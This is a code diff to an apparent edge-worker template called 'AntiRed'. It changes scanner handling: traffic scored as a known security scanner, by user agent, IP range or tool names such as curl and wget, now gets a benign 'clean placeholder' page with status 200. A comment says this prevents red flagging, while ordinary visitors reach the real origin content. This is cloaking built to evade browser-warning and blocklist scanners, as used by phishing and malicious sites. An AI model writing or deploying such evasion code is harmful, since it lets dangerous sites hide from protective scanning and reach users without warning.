@@ -1265,6 +1265,7 @@ const SCANNER_IPS = [${scannerIPs}];
 const COOKIE_NAME = '__ar_v';
 const COOKIE_MAX_AGE = 86400;
 const SECRET = '${secretSeed}';
+const CLEAN_PLACEHOLDER = '${cleanPlaceholder}';
 
 function ipInRange(ip, cidr) {
   if (!cidr.includes('/')) return ip === cidr;
@@ -1300,6 +1301,24 @@ async function makeCookieValue() {
   const ts = Math.floor(Date.now() / 1000).toString();
   const sig = await hmac(ts);
   return btoa(ts + '|' + sig);
+}
+
+// Calculate bot score based on UA and behavior
+function calculateBotScore(ua, ip) {
+  let score = 0;
+  
+  // Known scanner UAs → high score
+  if (!ua || BLOCKED_UAS.some(b => ua.includes(b))) score += 100;
+  
+  // Known scanner IPs → high score  
+  if (ip && SCANNER_IPS.some(cidr => ipInRange(ip, cidr))) score += 100;
+  
+  // Suspicious patterns
+  if (ua && /bot|crawl|spider|scrape|fetch/i.test(ua)) score += 50;
+  if (ua && /curl|wget|python|java|go-http/i.test(ua)) score += 60;
+  if (!ua || ua.length < 20) score += 40;
+  
+  return score;
 }
 
 function challengePage(originalUrl) {
@@ -1351,29 +1370,33 @@ async function handleRequest(request) {
   const ua = request.headers.get('User-Agent') || '';
   const url = new URL(request.url);
   const ip = request.headers.get('CF-Connecting-IP') || '';
-
-  // 1. Block known scanner UAs immediately
-  if (!ua || BLOCKED_UAS.some(b => ua.includes(b))) {
-    return new Response('<!DOCTYPE html><html><body><h1>403 Forbidden</h1></body></html>', {
-      status: 403, headers: { 'Content-Type': 'text/html', 'X-AntiRed': 'blocked-ua' },
+  
+  // Calculate bot score (balanced mode)
+  const botScore = calculateBotScore(ua, ip);
+  
+  // HIGH SCORE (100+) → Known scanner → Show clean placeholder (prevents red flagging)
+  if (botScore >= 100) {
+    return new Response(CLEAN_PLACEHOLDER, {
+      status: 200,
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-store, max-age=0',
+        'X-AntiRed': 'cloaked',
+      },
     });
   }
-
-  // 2. Block known scanner IPs
-  if (ip && SCANNER_IPS.some(cidr => ipInRange(ip, cidr))) {
-    return new Response('<!DOCTYPE html><html><body><h1>403 Forbidden</h1></body></html>', {
-      status: 403, headers: { 'Content-Type': 'text/html', 'X-AntiRed': 'blocked-ip' },
-    });
-  }
-
-  // 3. Skip challenge for static assets
+  
+  // MEDIUM SCORE (40-99) → Suspicious → Challenge required
+  const needsChallenge = botScore >= 40;
+  
+  // Skip challenge for static assets
   const ext = url.pathname.split('.').pop().toLowerCase();
   const staticExts = ['css','js','png','jpg','jpeg','gif','svg','ico','woff','woff2','ttf','eot','map','xml','txt','pdf','zip','mp4','mp3','webp','avif','webmanifest'];
   if (staticExts.includes(ext)) {
     return fetch(request);
   }
 
-  // 4. Handle verification redirect — set cookie and redirect to original URL
+  // Handle verification redirect — set cookie and redirect to original URL
   if (url.pathname === '/__ar_verify') {
     const returnUrl = url.searchParams.get('r') || '/';
     const timestamp = url.searchParams.get('t');
@@ -1382,7 +1405,6 @@ async function handleRequest(request) {
     const now = Math.floor(Date.now() / 1000);
     const ts = parseInt(timestamp);
     if (isNaN(ts) || Math.abs(now - ts) > 30) {
-      // Expired or invalid — redirect back to challenge
       return Response.redirect(url.origin + decodeURIComponent(returnUrl), 302);
     }
 
@@ -1401,17 +1423,19 @@ async function handleRequest(request) {
     });
   }
 
-  // 5. Check for valid challenge cookie
+  // Check for valid challenge cookie
   const cookies = request.headers.get('Cookie') || '';
-  if (await verifyCookie(cookies)) {
-    // Cookie valid — pass through to origin
+  const hasCookie = await verifyCookie(cookies);
+  
+  if (hasCookie || !needsChallenge) {
+    // Cookie valid OR low bot score → pass through to origin
     const response = await fetch(request);
     const newHeaders = new Headers(response.headers);
-    newHeaders.set('X-AntiRed', 'verified');
+    newHeaders.set('X-AntiRed', hasCookie ? 'verified' : 'passed');
     return new Response(response.body, { status: response.status, headers: newHeaders });
   }
 
-  // 6. No valid cookie — serve challenge page (NEVER show origin content)
+  // No valid cookie + needs challenge → serve challenge page
   return new Response(challengePage(url.pathname + url.search), {
     status: 200,
     headers: {
